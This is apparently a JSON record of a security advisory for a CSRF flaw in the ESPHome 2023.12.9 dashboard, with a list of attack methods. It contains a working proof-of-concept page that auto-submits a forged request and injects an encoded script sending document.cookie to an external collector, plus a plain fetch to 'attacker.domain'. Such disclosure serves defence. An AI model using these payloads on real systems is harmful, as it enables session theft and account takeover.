{"description": "### Summary\nAPI endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out attacks against a logged user of the dashboard to perform operations on configuration files (create, edit, delete).\n\n### Details\nIt is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.\n\n### PoC\nAn example of malicious web page that abuses this vulnerability:\n\n\n<html>\n  <body>\n\t<form action=\"http://localhost:6052/edit?configuration=poc.yaml\" id=\"#main\" method=\"POST\" enctype=\"text/plain\" onsubmit=\"setTimeout(function () { window.location.reload(); }, 10)\">\n  \t<input type=\"hidden\" name=\"&lt;script&gt;&#13;&#10;fetch&#40;&apos;https&#58;&#47;&#47;907zv9yp9u3rjerkiakydpvcr3xulk99&#46;oastify&#46;com&#63;x\" value=\"y&apos;&#44;&#32;&#123;&#13;&#10;method&#58;&#32;&apos;POST&apos;&#44;&#13;&#10;mode&#58;&#32;&apos;no&#45;cors&apos;&#44;&#13;&#10;body&#58;document&#46;cookie&#13;&#10;&#125;&#41;&#59;&#13;&#10;&lt;&#47;script&gt;&#13;&#10;\" />\n\t</form>\n\n\t<script>\n  \tdocument.forms[0].submit();\n\t</script>\n\n\t<script>\n\t</script>\n  </body>\n</html>\n\nIn which an attacker creates and weaponizes \"poc.yaml\" config file containing a cookie exfiltration script and forces the payload triggering visiting the vulnerable page.\n\n\nExample of such script:\n<script>\nfetch('https://attacker.domain', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n</script>\n\n\n### Impact\nThis vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of a logged user. In order to trigger the vulnerability, the victim must visit a weaponized page.\n\nIn addition to this, it is possible to chain this vulnerability with GHSA-9p43-hj5j-96h5 (as seen in the PoC) to obtain a complete takeover of the user account.\n\n", "methods": ["Used Cross-Site Request Forgery (CSRF) to bypass authentication on API calls.", "Created a malicious web page to trigger the vulnerability.", "Used a crafted web page to submit a POST request to the vulnerable API endpoint.", "Used a hidden input field to inject a script that fetches a malicious payload.", "Used the `fetch` API to send a POST request with the victim's cookie to the attacker's domain.", "Chained the CSRF vulnerability with another vulnerability (GHSA-9p43-hj5j-96h5) to obtain a complete takeover of the user account."]}